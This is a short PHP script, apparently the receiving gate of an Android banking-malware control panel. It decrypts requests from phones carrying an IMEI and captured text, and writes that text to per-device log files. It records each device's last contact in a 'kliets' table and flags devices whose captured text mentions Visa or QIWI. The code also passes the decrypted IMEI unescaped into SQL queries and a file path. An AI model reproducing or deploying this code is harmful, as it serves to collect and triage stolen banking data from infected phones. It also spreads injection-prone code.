<?php  
include 'crypt.php';
include 'config.php';


$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);

$massivReq = explode("|", $request);
$IMEI_log = $massivReq[0]; 
$text_log = $massivReq[1]; 

echo "$IMEI_log $text_log";

if(($IMEI_log != "") && ($text_log != ""))
{
	//Записываем ЛОГи!    
	$path_log = "logs/$IMEI_log.log";	
	$perehod = "\n";
	$str_log = "$IMEI_log: $text_log$perehod";
	file_put_contents($path_log, $str_log, FILE_APPEND);

	$massiv_visa = array('visa', 'VISA','Visa','QIWI');

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$data_ = date('Y-m-d H:i');
	$sql3 = "UPDATE kliets SET lastConnect = '$data_' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
	
	$sql3 = "UPDATE kliets SET log = '1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
		
	foreach($massiv_visa as $sl_visa)
	{
		if (strpos($text_log, $sl_visa) == true) 
		{
			$sql3 = "UPDATE kliets SET l_bank = '1' WHERE IMEI = '$IMEI_log';";
			$connection->query($sql3);
		}
	}
}
?>